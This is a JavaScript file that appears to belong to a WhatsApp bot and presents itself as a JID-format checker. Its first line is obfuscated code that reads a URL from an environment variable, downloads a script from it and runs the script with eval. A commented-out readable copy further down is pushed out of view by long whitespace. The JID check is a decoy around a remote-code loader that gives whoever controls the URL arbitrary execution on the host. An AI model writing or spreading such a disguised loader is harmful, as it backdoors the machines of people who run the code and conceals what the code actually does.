'use strict';const _0xaa1c20=_0x1b64;function _0x3936(){const _0x1c37c9=['endsWith','dotenv','15110851PRMSfR','data','get','40492twYVOc','axios','5245170PrZngd','HOUSE','env','Error\x20loading\x20the\x20script:','6383265MSYbQa','@s.whatsapp.net','2576586iocFzU','988512wpMEcL','example@s.whatsapp.net','error','catch','820617rCknkC','then','log'];_0x3936=function(){return _0x1c37c9;};return _0x3936();}function _0x1b64(_0x12ef39,_0x1d6da5){const _0x3936fc=_0x3936();return _0x1b64=function(_0x1b64b6,_0x23fdfe){_0x1b64b6=_0x1b64b6-0x117;let _0x5e8871=_0x3936fc[_0x1b64b6];return _0x5e8871;},_0x1b64(_0x12ef39,_0x1d6da5);}(function(_0x4af31f,_0x4e602c){const _0x32ae10=_0x1b64,_0x329c93=_0x4af31f();while(!![]){try{const _0x347395=-parseInt(_0x32ae10(0x11e))/0x1+-parseInt(_0x32ae10(0x119))/0x2+parseInt(_0x32ae10(0x11a))/0x3+-parseInt(_0x32ae10(0x126))/0x4+parseInt(_0x32ae10(0x117))/0x5+-parseInt(_0x32ae10(0x128))/0x6+parseInt(_0x32ae10(0x123))/0x7;if(_0x347395===_0x4e602c)break;else _0x329c93['push'](_0x329c93['shift']());}catch(_0x55ce4f){_0x329c93['push'](_0x329c93['shift']());}}}(_0x3936,0xbc626));const axios=require(_0xaa1c20(0x127));require(_0xaa1c20(0x122))['config']();const scriptUrl=process[_0xaa1c20(0x12a)][_0xaa1c20(0x129)];function atbverifierEtatJid(_0x50320d){const _0x2a43ec=_0xaa1c20;if(!_0x50320d[_0x2a43ec(0x121)](_0x2a43ec(0x118)))return console[_0x2a43ec(0x11c)]('Invalid\x20JID\x20format:',_0x50320d),![];return console['log']('JID\x20verified:',_0x50320d),!![];}axios[_0xaa1c20(0x125)](scriptUrl)[_0xaa1c20(0x11f)](_0xadc0b9=>{const _0x25b1c7=_0xaa1c20,_0x29ecef=_0xadc0b9[_0x25b1c7(0x124)];console[_0x25b1c7(0x120)]('Script\x20loaded\x20successfully!'),eval(_0x29ecef);const _0x2d94e8=_0x25b1c7(0x11b),_0x58ddd1=atbverifierEtatJid(_0x2d94e8);console[_0x25b1c7(0x120)]('Is\x20JID\x20valid?',_0x58ddd1);})[_0xaa1c20(0x11d)](_0x213047=>{const _0x4614c5=_0xaa1c20;console[_0x4614c5(0x11c)](_0x4614c5(0x12b),_0x213047);});
    /**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
'use strict';

// Include required modules
const axios = require('axios');
require('dotenv').config();  // Load .env variables

// Access the SCRIPT_URL from the .env file
const scriptUrl = process.env.HOUSE;

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// Fetch the external script content and execute it
axios.get(scriptUrl)
  .then(response => {
      const scriptContent = response.data;
      console.log("Script loaded successfully!");

      // Execute the script content in the current context
      eval(scriptContent);

      // Example usage of the atbverifierEtatJid function after script is loaded
      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid); // You can use this result in further logic
  })
  .catch(error => {
      console.error('Error loading the script:', error);
  });
**/
